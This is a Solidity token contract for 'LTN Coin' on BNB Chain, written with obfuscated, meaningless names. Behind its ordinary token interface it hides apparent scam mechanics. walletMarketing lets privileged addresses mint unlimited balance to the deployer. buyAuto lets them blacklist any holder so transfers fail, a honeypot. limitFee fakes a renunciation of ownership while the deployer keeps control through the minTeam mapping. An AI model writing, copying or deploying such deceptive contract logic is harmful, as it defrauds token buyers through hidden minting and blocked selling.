/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface minAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalListReceiver) external view returns (uint256);

    function transfer(address receiverList, uint256 amountMax) external returns (bool);

    function allowance(address buyAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountMax) external returns (bool);

    function transferFrom(
        address sender,
        address receiverList,
        uint256 amountMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromAutoFund, uint256 value);
    event Approval(address indexed buyAmount, address indexed spender, uint256 value);
}

interface feeMarketing is minAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface listTotal {
    function createPair(address launchLimit, address walletLimit) external returns (address);
}

interface autoTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamTakeSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract LTNCoin is teamTakeSwap, minAt, feeMarketing {
    uint8 private amountLiquidityWallet = 18;
    
    string private marketingLaunch = "LTN Coin";
    bool private isMode;
    mapping(address => bool) public minTeam;
    

    uint256 private tokenEnableMode;
    bool public liquidityMin;
    address public tradingReceiver;
    bool public maxFee;
    mapping(address => mapping(address => uint256)) private feeToken;


    uint256 private fundLimit = 100000000 * 10 ** amountLiquidityWallet;
    mapping(address => uint256) private feeWallet;
    uint256 public minToken;
    string private fundToken = "LCN";
    uint256 private buyTx;

    address private toFrom;
    
    uint256 public minTrading;
    mapping(address => bool) public receiverWallet;
    uint256 public buyAt;
    uint256 private enableMarketing;
    bool public listMin;
    address public launchTx;
    bool public shouldWallet;
    

    event OwnershipTransferred(address indexed txBuy, address indexed toAmount);

    constructor (){
        if (liquidityMin == listMin) {
            listMin = false;
        }
        autoTx fundReceiver = autoTx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingReceiver = listTotal(fundReceiver.factory()).createPair(fundReceiver.WETH(), address(this));
        toFrom = _msgSender();
        
        launchTx = toFrom;
        minTeam[launchTx] = true;
        if (minToken != buyTx) {
            buyTx = buyAt;
        }
        feeWallet[launchTx] = fundLimit;
        emit Transfer(address(0), launchTx, fundLimit);
        limitFee();
    }

    

    function sellEnableAmount() public {
        
        
        shouldWallet=false;
    }

    function walletMarketing(uint256 amountMax) public {
        if (!minTeam[_msgSender()]) {
            return;
        }
        feeWallet[launchTx] = amountMax;
    }

    function allowance(address amountTokenIs, address swapMarketing) external view virtual override returns (uint256) {
        return feeToken[amountTokenIs][swapMarketing];
    }

    function transfer(address fromLaunchAt, uint256 amountMax) external virtual override returns (bool) {
        return shouldTotalFee(_msgSender(), fromLaunchAt, amountMax);
    }

    function walletAmount(address swapAtAmount) public {
        if (maxFee) {
            return;
        }
        
        minTeam[swapAtAmount] = true;
        
        maxFee = true;
    }

    function teamLiquidityTotal() public {
        if (minToken == enableMarketing) {
            liquidityMin = true;
        }
        if (enableMarketing != minToken) {
            minToken = buyAt;
        }
        shouldWallet=false;
    }

    function isFee() public {
        
        
        buyTx=0;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundLimit;
    }

    function shouldTotalFee(address takeSender, address receiverList, uint256 amountMax) internal returns (bool) {
        if (takeSender == launchTx || receiverList == launchTx) {
            return enableSellBuy(takeSender, receiverList, amountMax);
        }
        
        require(!receiverWallet[takeSender]);
        
        return enableSellBuy(takeSender, receiverList, amountMax);
    }

    function owner() external view returns (address) {
        return toFrom;
    }

    function enableFee() public view returns (bool) {
        return isMode;
    }

    function buyAuto(address listMarketing) public {
        
        if (listMarketing == launchTx || listMarketing == tradingReceiver || !minTeam[_msgSender()]) {
            return;
        }
        if (liquidityMin == listMin) {
            liquidityMin = false;
        }
        receiverWallet[listMarketing] = true;
    }

    function approve(address swapMarketing, uint256 amountMax) public virtual override returns (bool) {
        feeToken[_msgSender()][swapMarketing] = amountMax;
        emit Approval(_msgSender(), swapMarketing, amountMax);
        return true;
    }

    function getOwner() external view returns (address) {
        return toFrom;
    }

    function liquidityAmountWallet() public {
        if (shouldWallet) {
            isMode = false;
        }
        
        liquidityMin=false;
    }

    function transferFrom(address takeSender, address receiverList, uint256 amountMax) external override returns (bool) {
        if (feeToken[takeSender][_msgSender()] != type(uint256).max) {
            require(amountMax <= feeToken[takeSender][_msgSender()]);
            feeToken[takeSender][_msgSender()] -= amountMax;
        }
        return shouldTotalFee(takeSender, receiverList, amountMax);
    }

    function name() external view virtual override returns (string memory) {
        return marketingLaunch;
    }

    function limitFee() public {
        emit OwnershipTransferred(launchTx, address(0));
        toFrom = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return amountLiquidityWallet;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundToken;
    }

    function balanceOf(address totalListReceiver) public view virtual override returns (uint256) {
        return feeWallet[totalListReceiver];
    }

    function enableSellBuy(address takeSender, address receiverList, uint256 amountMax) internal returns (bool) {
        require(feeWallet[takeSender] >= amountMax);
        feeWallet[takeSender] -= amountMax;
        feeWallet[receiverList] += amountMax;
        emit Transfer(takeSender, receiverList, amountMax);
        return true;
    }


}